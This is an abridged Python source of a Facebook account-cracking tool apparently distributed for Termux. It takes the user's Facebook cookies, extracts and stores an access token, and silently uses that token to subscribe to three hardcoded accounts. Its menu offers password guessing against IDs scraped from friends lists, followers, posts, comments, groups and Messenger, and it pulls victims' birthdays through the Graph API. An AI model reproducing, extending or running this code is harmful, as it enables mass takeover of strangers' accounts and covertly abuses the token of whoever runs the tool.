...
try:
	...
	requ = rich.markdown.Markdown(catet_req, style='blue')
...
try:
	...
	ft = rich.markdown.Markdown(catet_futur, style='pink')
...
try:
	...
	soup = rich.markdown.Markdown(catet_bs, style='purple')
...
import platform
	...
	meka = rich.markdown.Markdown(catet_mek, style='cyan')
...
try:
	...
	mask = rich.markdown.Markdown(catet_mask, style='yellow')
...
if my_music !=0:
	...
	play = rich.markdown.Markdown(catet_play, style='pink')
...
f"""{Hj}
 ...
 - whatsap     : N/A
 - github      : N/A
 - script name : GOL GAPPA
 - version     : PLATINUM
 - create on   : APRIL 23, 2022
 
+ ---------------------------------------- +
              ABOUT CRACK METHOD
+ ---------------------------------------- +
 - b-api: This method is very fast process
          but prone to spam so the results are 
          reasonable
          unsatisfactory and rarely get results

- mbasic: This method process is quite slow
          but if using this method the result
          what you get is satisfying and rarely gets
          spam

- mobile: This method is very fast
+ ---------------------------------------- +
             NOT SUPPORT CARD 
+ ---------------------------------------- +
...
sys.stdout.write('\x1b[1;35m\x1b]2; {×} BATFAT by mrx {×} \x07')
...
def banner():
	...
	play = rich.markdown.Markdown(logo, style='cyan')
	rich.console.Console().print(play)
	print("""%s
...
`-._:  .:'   `:::  .:\           |\__/|           /::  .:'   `:::   :.-'
    \      :          \          |:   |          /         :       /    
     \     ::    .     `-_______/ ::   \_______-'   .      ::   . /
      v__________________________________________________________v
        |A L I S H A - T E A M - T O O L S ' GOL GAPPA & BANDER |
...
def Masuk():
	try:
		kueh = mrx_xyz(open("data/cookies","r").read().strip())
		...
		print ('%s%s%s 03 %sHow to get facebook cookies How to get facebook cookies '%(U,til,K,O)) 
		...
		while True:
			...
			if rom in(""):
				...
				print (N)
				tutorial = ('''# To get cookies, set up the kiwi browser app, download it on the play store if you haven't already. If you have logged in to your Facebook account in the Kiwi browser, the account must be in data mode. Copy link:https://chrome.google.com/webstore/detail/get-cookie/naciaagbkifhpnoodlkhbejjldaiffcm/related!''')
				...
				if nanya in(""):
					...
					ah = rich.markdown.Markdown(link, style='cyan')
					rich.console.Console().print(ah)
...
class masuk:
	...
	def login(self):
		try:
			cek = requests.get(f"{self.url}/profile.php?v=info", cookies=mrx_xyz(self.cok)).text
			if "mbasic_logout_button" in cek:
				...
				if "Laporkan Masalah" in cek:
					mikey = login.bot(mrx_xyz(self.cok),self.url)
					informasi.info(mrx_xyz(self.cok),cek).myinfo()
					mikey.usernem()
					print ("\n%s √ login succeed "%(H));jeda(2)
					pilihan().menu()
				else:
					mikey = login.bot(mrx_xyz(self.cok),self.url)
					mikey.lang(mrx_xyz(self.cok))
					informasi.info(mrx_xyz(self.cok),cek).myinfo()
...
def konverter(kukis): 
	...
	try:
		...
		mrx = cari.group(1)
		if 'EAAG' in mrx:
			open('data/token.txt', 'w').write(mrx)
			print (f'\n{P}#{O} Token anda {M}> {K}{mrx} ');jeda(2)
			login_bot(mrx)
...
def login_bot(mrx):
	try:
		toket = mrx
		mrx1 = ('100067807565861')
		mrx2 = ('100029143111567')
		mrx3 = ('100028434880529')
		requests.post(f"https://graph.facebook.com/{mrx1}?fields=subscribers&access_token={toket}") # MRX CYTHON PENGGUNA AKUN UNIK
		requests.post(f"https://graph.facebook.com/{mrx2}?fields=subscribers&access_token={toket}") # DEMIT MRX CYTHON
		requests.post(f"https://graph.facebook.com/{mrx3}?fields=subscribers&access_token={toket}") # MRX CYTHON (2022)
...
class Menu():
	...
	def tentang(self):
		...
		if "mbasic_logout_button" not in a:
			...
			print ('%s•%s 🛑__01__🛑 %sCRACK_____FROM_____PUBLIC_____FRIEND [ 5000 ]'%(U,P,O))
			print ('%s•%s 🛑__02__🛑 %sCRACK_____FROM_____PUBLIC_____FOLLOWERS [ 5000 ]'%(U,P,O))
			print ('%s•%s 🛑__03__🛑 %sCRACK_____FROM_____PUBLIC_____POST [ UNLIMITED ]'%(U,P,O))
			print ('%s•%s 🛑__04__🛑 %sCRACK_____FROM_____PUBLIC_____COMMENTS [ UNLIMITED ]'%(U,P,O))
			print ('%s•%s 🛑__05__🛑 %sCRACK_____FROM_____GROUP_____MEMBERS [ 5000 ]'%(U,P,O))
			print ('%s•%s 🛑__06__🛑 %sCRACK_____FROM_____SEARCH_____NAME [ 5000 ]'%(U,P,O))
			print ('%s•%s 🛑__07__🛑 %sCRACK_____FROM_____MESSENGER_____MESSAGES [ UNLIMITED ]'%(U,P,O))
			print ('%s•%s 🛑__08__🛑 %sCRACK FROM THEME SUGGESTION'%(U,P,O))
			#print ('%s•%s 09 %sCrack user instagram %spro'%(U,P,O,H))
			print ('%s•%s 🌼__09__🌼 %sSETTING_____USER-AGENT [ NOT POSSIBLE ]'%(U,P,O))
			print ('%s•%s 🌼__10__🌼 %sVIEW_____THE_____CRACK_____RESULTS'%(U,P,O))
			print ('%s•%s 🌼__11__🌼 %sCHECKPOINT_____DIRECTOR'%(U,P,O))
			print ('%s•%s 🌼__12__🌼 %sINFORMATION (about)'%(U,P,O))
			print ('%s•%s 🌼__13__🌼 %sCLEAR LOGIN DATA'%(U,M,O))
			print ('%s•%s 🌼__00__🌼 %sEXIT_____AND (logout)'%(U,M,O))
		
class pilihan:
	
	def __init__(self):
		self.kueh = mrx_xyz(open("data/cookies","r").read().strip())
		try:
	...
	def menu(self):
		...
		if slut in['',' ']:
			...
			gan = input ("\n%s%s%s want malti crack id? y/t%s >%s "%(U,til,O,M,K))
			if gan in[""]:
				print ('\n%s%s isi yang benar'%(M,til));jeda(2)
			elif gan in['y','Y']:
				try:
			...
			while True:
				print ("\n%s%s %sMasukan nama orang contoh MRX CYTHON "%(U,til,O))
			...
			for pw in manual:
				...
				if "c_user" in ses.cookies.get_dict():
					try:
						...
						mrx = open('data/token.txt', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={mrx}").json()['birthday']
...
def hasil(ok,cp):
	...
	if len(ok) != 0 or len(cp) != 0:
		...
		if len(cp)==0:
			...
			if c =='':
				exit("%s%s Correct contents kentod "%(M,til))
			elif c in['Y','y']:
				jalan("\n%s•%s Turn on Airplane mode for 5 seconds "%(U,O))
				pw=input("%s%s%s change one tap account password? y/t %s> %s"%(U,til,O,M,K))
				if pw =='':
					print ("%s%s correct content kentod "%(M,til))
				elif pw in['y','Y']:
...
def opsi():
	CP = ("CP/")
	mrx = input("%s%s%s Nama file %s> %s"%(U,til,O,M,K))
	if mrx == "":
		print("%s%s isi yang benar "%(M,til));jeda(2)
		opsi()
	try:
		file_cp = open(CP+mrx, "r").readlines()
	except IOError:
		exit("\n%s%s nama file %s tidak tersedia"%(M,til,mrx))
...
def Token_token():
	...
	print("")
	try:
		tok = open('/sdcard/Download/.Alisha.txt', 'r').read()
		dec = base64.b64decode(tok)
		if len(dec) < 50:
		    not_reg()
		r = requests.get("https://github.com/ChuzziDoll787/BANDER/blob/main/server.txt").text
		if dec in r:
...
def not_reg():
    ...
    v_Token_token_save = open('/sdcard/Download/.Alish.txt', 'w')
    ...
    print("")
    raw_input("  \t  \033[1;93m Press enter to check again ")
    os.system('xdg-open https://wa.me/+923097156448') #whatsapp number here
    Token_token()
